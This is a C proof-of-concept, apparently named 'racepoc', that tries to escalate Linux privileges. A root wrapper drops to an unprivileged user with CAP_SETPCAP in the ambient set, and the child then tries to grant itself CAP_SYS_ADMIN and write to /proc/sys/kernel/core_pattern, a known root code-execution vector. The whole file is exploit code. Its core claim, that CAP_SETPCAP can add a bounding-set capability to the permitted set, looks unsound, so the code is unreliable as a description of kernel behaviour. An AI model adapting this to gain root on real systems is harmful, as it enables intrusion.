/* Live exec-time credential snapshot demonstration.
 * wrapper (root): keep CAP_SETPCAP only, drop SYS_ADMIN from permitted and
 *                 inheritable (but leave it in the bounding set), raise
 *                 CAP_SETPCAP into the ambient set, become uid 1000, exec child.
 * child:          observe SYS_ADMIN absent at exec, then use CAP_SETPCAP to
 *                 add SYS_ADMIN from the bounding set and write core_pattern.
 * Raw syscalls only; compiles statically without libcap.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <stdint.h>

#define V3 0x20080522u
#define CAP_SETPCAP 8
#define CAP_SYS_ADMIN 21
#define CAP_SETUID 7
#define PR_CAP_AMBIENT 47
#define PR_CAP_AMBIENT_RAISE 2

struct hdr { uint32_t version; int pid; };
struct dat { uint32_t effective, permitted, inheritable; };

static void getcaps(struct dat d[2]) {
    struct hdr h = { V3, 0 };
    d[0] = (struct dat){0,0,0}; d[1] = (struct dat){0,0,0};
    syscall(SYS_capget, &h, d);
}
static int setcaps(struct dat d[2]) {
    struct hdr h = { V3, 0 };
    return syscall(SYS_capset, &h, d);
}
static int has(unsigned v, int c) { return !!(v & (1u << c)); }

int main(int argc, char **argv) {
    struct dat d[2];
    if (argc < 2) return 1;

    if (!strcmp(argv[1], "wrapper")) {
        getcaps(d);
        printf("WRAPPER_START uid=%d eff=0x%x perm=0x%x\n",
               getuid(), d[0].effective, d[0].permitted); fflush(stdout);
        prctl(1, 1);                              /* PR_SET_KEEPCAPS */
        d[0].effective = (1u << CAP_SETUID) | (1u << CAP_SETPCAP);
        d[0].permitted = (1u << CAP_SETUID) | (1u << CAP_SETPCAP);
        d[0].inheritable = (1u << CAP_SETPCAP);
        d[1] = (struct dat){0,0,0};
        if (setcaps(d)) { perror("capset-wrapper"); return 2; }
        if (setuid(1000)) { perror("setuid"); return 3; }
        getcaps(d);
        printf("WRAPPER_POST_SETUID uid=%d eff=0x%x perm=0x%x inh=0x%x\n",
               getuid(), d[0].effective, d[0].permitted, d[0].inheritable); fflush(stdout);
        d[0].effective = (1u << CAP_SETPCAP);
        d[0].permitted = (1u << CAP_SETPCAP);
        if (setcaps(d)) { perror("capset-post-setuid"); return 8; }
        if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, CAP_SETPCAP, 0, 0)) {
            perror("ambient-raise"); return 4;
        }
        getcaps(d);
        printf("WRAPPER_PRE_EXEC uid=%d eff=0x%x perm=0x%x\n",
               getuid(), d[0].effective, d[0].permitted); fflush(stdout);
        execl("/var/tmp/racepoc", "racepoc", "child", (char *)NULL);
        perror("execl"); return 5;
    }

    if (!strcmp(argv[1], "child")) {
        getcaps(d);
        printf("CHILD_AT_EXEC uid=%d eff=0x%x has_SYS_ADMIN=%d\n",
               getuid(), d[0].effective, has(d[0].effective, CAP_SYS_ADMIN));
        fflush(stdout);
        /* Gain SYS_ADMIN from the bounding set AFTER exec, via CAP_SETPCAP. */
        d[0].effective |= (1u << CAP_SYS_ADMIN);
        d[0].permitted |= (1u << CAP_SYS_ADMIN);
        if (setcaps(d)) { perror("capset-gain"); return 6; }
        getcaps(d);
        printf("CHILD_AFTER_GAIN eff=0x%x has_SYS_ADMIN=%d\n",
               d[0].effective, has(d[0].effective, CAP_SYS_ADMIN)); fflush(stdout);
        int fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
        if (fd < 0) { perror("open"); return 7; }
        write(fd, "|/bin/true", 10); close(fd);
        printf("CHILD_WRITE_DONE\n"); fflush(stdout);
        sleep(12);
        return 0;
    }
    return 1;
}
